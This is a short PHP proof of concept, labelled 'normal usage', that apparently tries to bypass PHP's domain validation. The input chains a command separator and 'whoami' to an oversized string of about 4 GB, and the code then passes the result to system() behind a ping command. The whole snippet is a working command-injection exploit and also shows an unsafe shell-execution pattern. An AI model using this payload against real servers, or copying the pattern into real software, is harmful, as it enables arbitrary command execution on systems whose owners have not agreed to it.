<?php  
  
// normal usage  
$userinput = "5;whoami;"  .  str_repeat("a",  4294967286)  .  "a.com";
$command = "ping -c5 ";

if (filter_var($userinput, FILTER_VALIDATE_DOMAIN, FILTER_FLAG_HOSTNAME))
{
    echo system($command . $userinput, $retval);
}


  
?>